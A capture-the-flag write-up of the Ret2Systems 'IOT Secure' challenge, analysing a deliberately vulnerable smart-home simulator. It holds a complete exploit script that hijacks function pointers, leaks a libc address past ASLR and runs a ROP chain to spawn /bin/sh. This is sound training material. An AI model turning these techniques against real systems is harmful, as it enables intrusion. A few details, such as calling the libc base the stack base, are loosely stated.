+++
title = 'IOT Secure CTF [Ret2Systems]'
date = 2025-06-15T15:27:13+10:00
draft = false
description = "Even as modern desktops and servers gain more mitigations and protections, somehow Internet Of Things devices lag way behind. Yet people have started introducing countless \"smart\" devices into their home and onto their network. It is time to hack into these toasters, refrigerators, thermostats, and lightbulbs."
+++



## Problem Description

Even as modern desktops and servers gain more mitigations and protections, somehow Internet Of Things devices lag way behind.

Yet people have started introducing countless "smart" devices into their home and onto their network.

It is time to hack into these toasters, refrigerators, thermostats, and lightbulbs.

## Initial Analysis of the Challenge

I noticed some interesting function names when the file was loaded into Binary Ninja that I thought I may end up using later. 

1. fridgeBackdoorAuth
2. fridgeBackdoorManager
3. disable_system
4. initAlarm
5. printAlarmPassword
6. manageAlarm
7. fridgeBackdoor

To bypass the permissions and capture the flag, these are the restrictions I am working with.

```bash
[*] '/bin/p1_iot'
    Arch:      x86_64
    RELRO:     Full RELRO
    Stack:     Stack Cookie Detected
    NX:        NX Enabled
    ASLR:      Enabled
    PIE:       Enabled
```


## Analysis of the Source Code

Following an initial, thorough review of the code, I recorded several potential issues that required attention. Lets go through these potential issues.


- **Potential Issue 1:**
The “resp” variable does not look for where parsing stops. I don't encounter code that looks like this often so I made note of it.
```C
void manageAlarm()
{
    char buf[32] = {0};
    puts("ENTER ALARM PASSWORD TO CONTINUE:");
    fgets(buf, 32, stdin);
    
    unsigned long resp = strtoul(buf, 0, 10);

    .............
    (rest of the code)
}
```

- **Potential Issue 2:**
I was reading the lightBulb structure and noticed ```favNum``` has a maximum length of 10. But there was a logic error in the code that is allowing values greater than 10, you can access values outside of the array. The logic error is at ```if (favNum >= 0x10)```. The decimal of 0x10 is 16 allowing us to bypass the input restriction. At line ```lightBulb.current_color = lightBulb.favorite_colors[favNum];``` we may be able to modify variables outside the stated range.


```C
struct lightBulb
{
    unsigned int favorite_colors[10];
    void (*toggle)();
    unsigned int current_color;
    int on;
    unsigned long toast_count;
} lightBulb;
```

```C
void setLightbulb()
{
    puts(".-----------------------------------.");
    puts("| Colormatic |  Home  | [Settings]  |");
    puts("| --------------------------------- |");
    puts("| Menu:                             |");
    puts("|  [1] Set Directly                 |");
    puts("|  [2] Use Favorite                 |");
    puts("'-----------------------------------'");
    puts("Enter Choice:");
    int resp = get_uint();
    if (resp == 1)
    {
        printf("Enter color as hex:\n");
        lightBulb.current_color = get_hex32();
    }
    else if (resp == 2)
    {
        printf("Enter favorite number:\n");
        unsigned int favNum = get_uint();
        if (favNum >= 0x10)
        {
            printf( "Number out range\n" );
            return;
        }
 
        lightBulb.current_color = lightBulb.favorite_colors[favNum];
    }
}
```


- **Potential Issue 3:**
I built upon the previous logic flaw, manipulated the pointer used by ```lightbulb.toggle```. By loading my chosen address into color and then executing ```lightBulb.favorite_colors[favNum] = color;```, we can overwrite the destination that ```lightbulb.toggle``` jumps to, effectively re-routing the function call.

```C
void setLightbulbFavorite()
{
    printf("Enter favorite number:\n");
    unsigned int favNum = get_uint();
    if (favNum >= 0x10)
    {
        printf( "Number out range\n" );
        return;
    }

    printf("Enter color as hex:\n");
    unsigned int color = get_hex32();
   
    lightBulb.favorite_colors[favNum] = color;
    printf("%06x saved to favorite #%u:\n", color, favNum);
}
```

- **Potential Issue 4:**
The ```fireAlarm``` only allows 8 characters as input. In the ```manageFireAlarm``` I noticed a possibility of a logic bug, the loop breaks when index is 8 allowing for an extra character or two into the “alarm” function allowing us to modify the memory address of the ```fireAlarm.alarm``` and setting a memory address of our choice.

```C
struct fireAlarm
{
    char phone_number[8];
    void (*alarm)();
} fireAlarm;
```
```C
void manageFireAlarm()
{
    char buf[20] = {0};
    puts("   _____________  ");
    puts("  /             \\");
    puts(" /       ""O""       \\ ");
    puts("|                 |");
    puts("|  Staysafe(tm).  |");
    puts("|    [ ""TEST"" ]     |");
    puts("|                 |");
    puts(" \\               /");
    puts("  \\_____________/");
    puts("Press TEST? [Y/n]");

    fgets(buf, 4, stdin);

    if (buf[0] == 'n' || buf[0] == 'N')
        return;

    puts("Enter phone number to test:");

    fgets(buf, 20, stdin);

    int index = 0;

    for (int i = 0; i < strlen(buf); i++)
    {
        if (buf[i] == '-' || buf[i] == '\n')
            continue;

        fireAlarm.phone_number[index] = buf[i];
        index++;
        

        if (index > 8)
            break;
    }


    puts("BEEP BEEP BEEP BEEP BEEP BEEP...");
    sleep(1);
    printf("Calling %.8s\n", fireAlarm.phone_number);
    sleep(1);
    puts("RING...");
    sleep(1);
    puts("No answer....");
}
```

- **Potential Issue 5:**
Each time the toaster toasts, the temperature jumps by 91 °F before the system runs a smoke check. 

```C
void setToasterTemperature()
{
    puts("Enter temperature:");
    unsigned int goal = get_uint();
    if (goal > 370)
    {
        puts("Unsafe temperature!");
        return;
    }
    toaster.goal_temperature = goal;
    printf("Temperature set to %u'F\n", toaster.goal_temperature);
}
```

```C
void makeToast()
{
    if (toaster.didToast)
    {
        puts("This toast has already been made!");
        return;
    }

    puts("Starting toast...");
    printToaster(0, 1, toaster.temperature);
    sleep(1);

    while (toaster.temperature < toaster.goal_temperature)
    {
        puts("...");
        toaster.temperature += 91;
        printToaster(0, 1, toaster.temperature);
        sleep(1);
        checkForSmoke();
    }
    puts("DING!");

    printToaster(1, 1, toaster.temperature);
    toaster.didToast = 1;
}
```


- **Potential Issue 6:**
This snippet of code could be used for aslr since password is pointing directly to exit.
```C
void initAlarm()
{
    password = exit;
    armed = 1;
}
```

- **Potential Issue 7:**
Displaying the password outright can leak its memory address, undermining ASLR. Note the formatting: it’s printed with the specifier %08lx, which: 
    - Pads with zeros instead of spaces (0)
    - Enforces a minimum field width of 8 characters (8)
    - Treats the value as a (unsigned) long (l)
    - Outputs it in lowercase hexadecimal (x).
```C
void printAlarmPassword()
{
    // ISSUE: 
    // 
    puts(".--------------------.");
    puts("| Current Password:  |");
    printf("|    %08lx    |\n", password); 
    puts("'--------------------'");
}
```



## Exploitation
When I first ran the program I noticed there was an error that stated "Warning fridge circuit overloaded,
Some devices may refuse to turn on". We will start by turning the fridge circuit off so we can interact with the other devices.

Lets begin the exploitation phase, I began by targetting the "Issue 1" (Fire Alarm) as discussed in our source code analysis. 

When prompted to enter a phone number to call, I sent in two extra bytes to modify the ```fire.alarm``` function.

```Python
p.readuntil('Enter phone number to test:')
p.sendline('1234567\x18\x05')
```

I pointed it to the ```fridgeBackdoor``` since I noticed it allowed me to access the ```fridgeBackdoorAuth```.

```assembly
Function fridgeBackdoor
1805:  push    rbp
1806:  mov     rbp, rsp
1809:  lea     rdi, [rel aConnectingtoback]  "Connecting to backdoor....."
1810:  call    puts
1815:  mov     eax, 0x0
181a:  call    fridgeBackdoorAuth
181f:  nop     
1820:  pop     rbp
1821:  retn    
```

In order to execute ```file.alarm``` I used the ```checkForSmoke``` function that can trigger a fire alarm if the temperature gets too high. I increased the temperature on the toaster to 370 degrees so the toast burns and starts to smoke.

When ```checkForSmoke``` reaches ```fireAlarm.alarm()```, it no longer dials the fire brigade. Instead, the call jumps to the arbitrary address. We injected that address overwriting ```fireAlarm.alarm``` during the phone number prompt and it executes our payload.

After gaining access to the ```fridgeBackdoor```, I was met with a prompt for a password. This is where more reverse engineering was required. After carefully analysing the assembly code below, I found that the desired value required was ```
0x2d64a```.

Furthermore, I found that the highest value I could enter was ```0x79```. The ```movsx rax, al``` interprets the byte as a signed int8 and extends the sign to 64 bits. So any ```byte ≥ 0x80``` is treated as a negative number.

The algorithm in itself was fairly basic, it added my a byte to the ```rbp-0x48``` register and then left shifted it by 1.

```assembly
0xff8:  push    rbp
0xff9:  mov     rbp, rsp
0xffc:  push    rbx
0xffd:  sub     rsp, 0x48
0x1001:  mov     rax, qword [fs:0x28]
0x100a:  mov     qword [rbp-0x18], rax
0x100e:  xor     eax, eax
0x1010:  mov     qword [rbp-0x40], 0x0
0x1018:  mov     qword [rbp-0x38], 0x0
0x1020:  mov     qword [rbp-0x30], 0x0
0x1028:  mov     qword [rbp-0x28], 0x0
0x1030:  lea     rdi, [rel data_2568]  "[31;1mPASSWORD REQUIRED TO CON…"
0x1037:  call    puts
0x103c:  mov     rdx, qword [rel stdin]
0x1043:  lea     rax, [rbp-0x40]
0x1047:  mov     esi, 0x20
0x104c:  mov     rdi, rax
0x104f:  call    fgets
0x1054:  mov     qword [rbp-0x48], 0x0
0x105c:  mov     dword [rbp-0x4c], 0x0
0x1063:  jmp     0x108d
0x1065:  mov     eax, dword [rbp-0x4c]
0x1068:  cdqe    
0x106a:  movzx   eax, byte [rbp+rax-0x40]
0x106f:  cmp     al, 0xa
0x1071:  je      0x10a6
0x1073:  mov     eax, dword [rbp-0x4c]
0x1076:  cdqe    
0x1078:  movzx   eax, byte [rbp+rax-0x40]
0x107d:  movsx   rax, al
0x1081:  add     qword [rbp-0x48], rax
0x1085:  shl     qword [rbp-0x48], 0x1
0x1089:  add     dword [rbp-0x4c], 0x1
0x108d:  mov     eax, dword [rbp-0x4c]
0x1090:  movsxd  rbx, eax
0x1093:  lea     rax, [rbp-0x40]
0x1097:  mov     rdi, rax
0x109a:  call    strlen
0x109f:  cmp     rbx, rax
0x10a2:  jb      0x1065
0x10a4:  jmp     0x10a7
0x10a6:  nop     
0x10a7:  cmp     qword [rbp-0x48], 0x2d64a
0x10af:  je      0x10c9
0x10b1:  lea     rdi, [rel data_2593]  "[31;1m!! BAD PASSWORD!![0m"
0x10b8:  call    puts
0x10bd:  mov     edi, 0x1
0x10c2:  call    sleep
0x10c7:  jmp     0x10d3
0x10c9:  mov     eax, 0x0
0x10ce:  call    fridgeBackdoorManager
0x10d3:  mov     rax, qword [rbp-0x18]
0x10d7:  xor     rax, qword [fs:0x28]
0x10e0:  je      0x10e7
0x10e2:  call    __stack_chk_fail
0x10e7:  add     rsp, 0x48
0x10eb:  pop     rbx
0x10ec:  pop     rbp
0x10ed:  retn    
```


The main task here was to find a number of bytes that when added and left shifted by 1 resulted in ```0x2d64a```. I created a python program to mimic the assembly code and made it print out the output for every byte it processes.

To find the bytes that resulted in ```0x2d64```, I mainly picked some numbers of my choice and changed them around until the ```total``` was ```0x2d64```.
```python
total = 0x00
password = [0x5, 0x5, 0x29, 0x72, 0x69, 0x71, 0x76, 0x79, 0x52, 0x45, 0x35, 0x7]

for character in password:
    signed = character - 0x100 if character >= 0x80 else character
    total += signed
    total = total << 1
    print("Hex: ", hex(total), " Number: ", total)

    if(total > 0x2d64a):
        break
```

After gaining access to the ```fridgeBackdoorManager``` I turned off the fridge circuit by cutting off the power. This allowed me to interact with other devices. The next device I interacted with was the light bulb since there was another potential vulnerability there of my interest. Since the circuit is not overloaded we can toggle the lightbulb and use it for potential exploitation.


I started by looking at Issue 2 & 3 to see if I could get any memory leaks. I used the logic bug stated in these issues to get an address leak. I made the program set the ```color``` to the 11th index which held the memory address of ```lightbulb.toggle``` and then printed it out. 

```bash
.-----------------------------------.
| Colormatic |  Home  | [Settings]  |
| --------------------------------- |
| Menu:                             |
|  [1] Set Directly                 |
|  [2] Use Favorite                 |
'-----------------------------------'
Enter Choice:
>> 2
Enter favorite number:
>> 11
.-----------------------------------.
| Colormatic | [ Home ] | Settings  |
| --------------------------------- |
| Menu:                             |
|  [1] Print Status                 |
|  [2] Set Color                    |
|  [3] Add Favorite Color           |
|  [4] Toggle Light                 |
|  [5] Quit                         |
'-----------------------------------'
Enter Choice:
>> 1
      \   ..---..  /      
    .    /       \   .    
    --  |         |   --  
  -     :         ;    -  
  .  /   \  \~/  /  \     
      /   `, Y ,'   ,  .  
   /    ,  |_|_|  \  .    
           |===|          
           |===|
            \_/
Light Is On. Color is #005567
.-----------------------------------.
| Colormatic | [ Home ] | Settings  |
| --------------------------------- |
| Menu:                             |
|  [1] Print Status                 |
|  [2] Set Color                    |
|  [3] Add Favorite Color           |
|  [4] Toggle Light                 |
|  [5] Quit                         |
'-----------------------------------'
Enter Choice:
```

Here I suspected there was a memory leak and my suspicions were confirmed to be true. This was only the second part of the address, I repeated the same steps to get the address to index 10. After combing the addresses from the 10th and 11th index, we can obtain full address of what ```lightbulb.toggle``` is pointing to. 

I modified the bytes of the 10th index address to ```414141``` and the 11th index to ```424242```. Now when I try to toggle the light, I am greeted with a seg fault.

```bash
Segmentation Fault
rax: 0x0000000000000000
rbx: 0x0000000000000000
rcx: 0x00000000ffffffda
rdx: 0x0042424200414141
rsi: 0x0000000000000004
rdi: 0x00007ffeca1a6d41
rbp: 0x00007ffeca1a6db0
rsp: 0x00007ffeca1a6d28
rip: 0x000055afd03df678
r8:  0x0000000000000000
r9:  0x1999999999999999
r10: 0x0000000000000000
r11: 0x00007f5a7b2295e0
r12: 0x000055afd03deb70
r13: 0x00007ffeca1a6ec0
r14: 0x0000000000000000
r15: 0x0000000000000000
fs:  0x0000000000000000
gs:  0x0000000000000000
eflags: 0x0000000000000044
```

To investigate this further, I used the command ```x/i $rip``` and saw the ```rip``` was running the instruction ```call rdx```. By modifying the ```rdx``` register, we can indirectly take control of the ```rip``` register. I ran the program again but this time only modified the last half of the address. 

**Note due to ASLR being enabled everytime I rerun the program the addresses will change**

I wanted to modify this address to point to ```printAlarmPassword``` located at ```0x55b802a391ab```. The ```toggleLightBulb``` function that is executed by default is located at ```0x55b802a39359```. Ideally we can just modify the last three characters and point the function (```lightbulb.toggle```) to ```printAlarmPassword```. As per our knowledge, ASLR is enabled but luckily we can leak the last 8 characters of the address from the 10th index. Then overwrite it by selecting ```[3] Add Favorite Color``` on the 10th index and replace it with ```0x55b802a391ab```. So when we select the 10th color and want to toggle the light, it will redirect to ```printAlarmPassword```. Getting the alarm password was pretty simple, since it would print itself out after toggling light.

The ```password``` is a memory address pointing to the ```exit``` function in libc as discussed in our source code analysis. I took the password and then calculated the offset, which was ```0x3a030```. You can obtain the base address of the stack by doing ```baseAddress = currentPassword - 0x3a030``` where currentPassword is value printed out by ```printAlarmPassword```.

To get a shell, I noticed that the stack has ```RW-``` permissions and we are able to write to the stack. In addition to this, the ```buf``` variable is avaliable in the ```manageLightbulb``` function, shown below.

```C
void manageLightbulb()
{
    char buf[100] = {0};
    puts("Connecting to <Colormatic Smart Lightbulb>");
    while (1)
    {
        puts(".-----------------------------------.");
        puts("| Colormatic | [ Home ] | Settings  |");
        puts("| --------------------------------- |");
        puts("| Menu:                             |");
        puts("|  [1] Print Status                 |");
        puts("|  [2] Set Color                    |");
        puts("|  [3] Add Favorite Color           |");
        puts("|  [4] Toggle Light                 |");
        puts("|  [5] Quit                         |");
        puts("'-----------------------------------'");
        puts("Enter Choice:");

        fgets(buf, sizeof(buf), stdin);
        int resp = atoi(buf);
        if (resp == 1)
        {
            printLightbulb(lightBulb.on, lightBulb.current_color);
            if (lightBulb.on)
            {
                printf("Light Is On. Color is #%06x\n", lightBulb.current_color);
            }
            else
            {
                printf("Light Is Off.\n");
            }
        }
        else if (resp == 2)
        {
            setLightbulb();
        }
        else if (resp == 3)
        {
            setLightbulbFavorite();
        }
        else if (resp == 4)
        {
            if (!circuit_overloaded)
            {
                lightBulb.toggle();
            }
            else
            {
                puts(RED".-----------------------------------.");
                puts(RED"| /!\\                               |");
                puts(RED"| Circuit is currently overloaded!  |");
                puts(RED"| Refusing to turn on.              |");
                puts(RED"| Please shut off the fridge first. |");
                puts(RED"'-----------------------------------'"RESET);
            }
        }
        else
        {
            return;
        }
    }
}
```

We are allowed to enter up to 100 bytes and this input is processed by the ```resp``` variable converting ```atoi(buf)```. I started my input with a "4AAAAAAAA". As a result of this ```buf = 4AAAAAAAA``` and ```resp = 4``` because ```atoi(buf)``` only understands base 10 digits. It will stop when it encounters a character that is not a digit, this allows us to still trigger ```lightbulb.toggle``` provided the first character is a 4. 

Before writing an ROP chain, I needed to stack pivot the ```rsp``` register to the ```buf``` variable. I used ROPGadget and added the code to my script for the pivot, addresses of the other gadgets that I needed for an ROP chain followed by my payload.

```C
# Slide stack by 0x28
stackPivot = baseAddress + 0x34ad2

binShAddress = baseAddress + 0x18cd57

popRdiAddress = baseAddress + 0x000000021102

popRaxAddress = baseAddress + 0x33544
popRsiAddress = baseAddress + 0x202e8
popRdxAddress = baseAddress + 0x1b92

syscallAddress = baseAddress + 0xbc375

payload = b"4" + (b"\x90" * 15) + p64(popRdiAddress) + p64(binShAddress) + p64(popRaxAddress) + p64(0x3b) + p64(popRsiAddress) + p64(0x0) + p64(popRdxAddress) + p64(0x00) + p64(syscallAddress)
p.sendline(payload)
```

I was able to ```cat flag``` and capture the flag (flag{The_S_1n_IOT_5t4ndz_f0r_S3cur1ty})

The full script is avaliable below:

```Python
import interact
import struct
import re

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()

p.readuntil('Enter Choice:')
p.sendline('4')
p.readuntil('Press TEST? [Y/n]')
p.sendline('Y')
p.readuntil('Enter phone number to test:')
p.sendline('1234567\x18\x05')
p.readuntil('Enter Choice:')
p.sendline('2')
p.readuntil('Enter Choice:')
p.sendline('2')
p.readuntil('Enter temperature:')
p.sendline('370')
p.readuntil('Enter Choice:')
p.sendline('3')
p.readuntil('{PASSWORD REQUIRED TO CONTINUE}')
p.sendline(b'\x05\x05\x29\x72\x69\x71\x76\x79\x52\x45\x35\x07')
p.readuntil('?')
p.sendline('0')
p.readuntil('Enter Choice:')
p.sendline('4')
p.readuntil('Enter Choice:')
p.sendline('1')
p.readuntil('Enter Choice:')
p.sendline('4')
p.readuntil('Enter Choice:')
p.sendline('1')
p.readuntil('Enter Choice:')
p.sendline('2')
p.readuntil('Enter Choice:')
p.sendline('2')
p.readuntil('Enter favorite number:')
p.sendline('10')
p.readuntil('Enter Choice:')
p.sendline('1')

lightOutput = p.readuntil(".-----------------------------------.")
lightOutput = lightOutput.decode('utf-8', errors='ignore')
m = re.search(r"Color\s+is\s+(#[0-9a-fA-F]{6}(?:[0-9a-fA-F]{2})?)", lightOutput)
lastEightBytes = m.group(1)[1:]

printAlarmPasswordAddress = lastEightBytes[0:5] + "1ab"

p.readuntil('Enter Choice:')
p.sendline('3')
p.readuntil('Enter favorite number:')
p.sendline('10')
p.readuntil('Enter color as hex:')
p.sendline(printAlarmPasswordAddress)
p.readuntil('Enter Choice:')
p.sendline('4')

currentPassword = p.readuntil(".-----------------------------------.")
currentPassword = '0x' + currentPassword.decode('utf-8', 'ignore').split("    ")[1]

currentPassword = int(currentPassword, 16)


manageAlarmAddress = lastEightBytes[0:5] + "1f1"

p.readuntil('Enter Choice:')
p.sendline('3')
p.readuntil('Enter favorite number:')
p.sendline('10')
p.readuntil('Enter color as hex:')
p.sendline(manageAlarmAddress)
p.readuntil('Enter Choice:')
p.sendline('4')


baseAddress = currentPassword - 0x3a030

binShAddress = baseAddress + 0x18cd57

popRdiAddress = baseAddress + 0x000000021102

leaveRet = baseAddress + 0x42351

popRaxAddress = baseAddress + 0x33544
popRsiAddress = baseAddress + 0x202e8
popRdxAddress = baseAddress + 0x1b92

syscallAddress = baseAddress + 0xbc375

# #0x28
stackPivot = baseAddress + 0x34ad2

p.readuntil("ENTER ALARM PASSWORD TO CONTINUE:")
p.sendline(str(currentPassword))
p.readuntil("Enter choice:")
p.sendline('1')
p.readuntil("Enter choice:")
p.sendline('3')

indexTen = str(hex(stackPivot))[-8:]
indexEleven = str(hex(stackPivot))[2:6]

p.readuntil("Enter Choice:")
p.sendline("3")
p.readuntil("Enter favorite number:")
p.sendline("10")
p.readuntil("Enter color as hex:")
p.sendline(indexTen)

p.readuntil("Enter Choice:")
p.sendline("3")
p.readuntil("Enter favorite number:")
p.sendline("11")
p.readuntil("Enter color as hex:")
p.sendline(indexEleven)




p.readuntil("Enter Choice:")
payload = b"4" + (b"\x90" * 15) + p64(popRdiAddress) + p64(binShAddress) + p64(popRaxAddress) + p64(0x3b) + p64(popRsiAddress) + p64(0x0) + p64(popRdxAddress) + p64(0x00) + p64(syscallAddress)
p.sendline(payload)



p.interactive()
```